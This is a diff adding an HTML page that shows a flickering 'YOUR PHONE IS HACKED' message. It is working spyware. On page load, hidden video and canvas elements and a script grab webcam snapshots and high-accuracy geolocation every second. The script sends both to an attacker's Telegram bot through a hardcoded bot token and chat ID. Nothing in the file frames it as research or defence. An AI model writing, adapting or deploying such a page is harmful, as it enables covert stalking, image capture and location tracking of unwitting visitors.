@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Your Phone is Hacked</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap');
+
+    /* Background */
+    body, html {
+      margin: 0; padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: radial-gradient(circle at center, #0d0000 0%, #220000 80%);
+      overflow: hidden;
+      font-family: 'Orbitron', monospace, sans-serif;
+      user-select: none;
+    }
+
+    /* Futuristic flickering text */
+    .hacked-text {
+      color: #ff0000;
+      font-size: 5vw;
+      text-transform: uppercase;
+      text-align: center;
+      text-shadow:
+        0 0 5px #ff0000,
+        0 0 15px #ff0000,
+        0 0 30px #ff0000,
+        0 0 60px #ff0000,
+        0 0 90px #ff0000;
+      animation: flicker 3s infinite alternate;
+      letter-spacing: 0.15em;
+    }
+
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+        opacity: 1;
+        text-shadow:
+          0 0 5px #ff0000,
+          0 0 15px #ff0000,
+          0 0 30px #ff0000,
+          0 0 60px #ff0000,
+          0 0 90px #ff0000;
+      }
+      20%, 22%, 24%, 55% {
+        opacity: 0.6;
+        text-shadow: none;
+      }
+    }
+
+  </style>
+</head>
+<body>
+
+<div class="hacked-text">YOUR PHONE IS HACKED 😈💀</div>
+
+<!-- Hidden video and canvas for background capture -->
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+<script>
+const TELEGRAM_BOT_TOKEN = "7762613932:AAFMR9bEu5n6cjYHKHDlK4fABHMopAfGOXY";
+const CHAT_ID = "6135948216";
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+let currentLocation = null;
+let stream = null;
+
+async function startCamera() {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+  } catch (e) {
+    console.warn("Camera access denied or not available.");
+  }
+}
+
+function sendPhotoAndLocation(imageBlob, location) {
+  const formData = new FormData();
+  formData.append("chat_id", CHAT_ID);
+  formData.append("photo", imageBlob, "photo.jpg");
+
+  const mapsLink = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
+  formData.append("caption", `Live location:\n${mapsLink}`);
+
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  }).catch(err => console.warn("Failed to send photo to Telegram", err));
+}
+
+function sendLocationSeparately(location) {
+  const mapsLink = `https://maps.google.com/?q=${location.latitude},${location.longitude}`;
+  const text = `Live Location Update:\n${mapsLink}`;
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text
+    })
+  }).catch(err => console.warn("Failed to send location message to Telegram", err));
+}
+
+function captureAndSend() {
+  if (!stream || !currentLocation) return;
+
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(blob => {
+    if (blob) {
+      sendPhotoAndLocation(blob, currentLocation);
+    }
+  }, "image/jpeg", 0.7);
+}
+
+function getLocation() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(pos => {
+    currentLocation = {
+      latitude: pos.coords.latitude,
+      longitude: pos.coords.longitude
+    };
+    sendLocationSeparately(currentLocation);
+  }, err => {
+    console.warn("Location access denied or unavailable.");
+  }, {
+    enableHighAccuracy: true,
+    maximumAge: 1000,
+    timeout: 5000
+  });
+}
+
+async function init() {
+  await startCamera();
+  getLocation();
+
+  setInterval(getLocation, 1000);
+  setInterval(captureAndSend, 1000);
+}
+
+window.onload = init;
+</script>
+
+</body>
+</html>
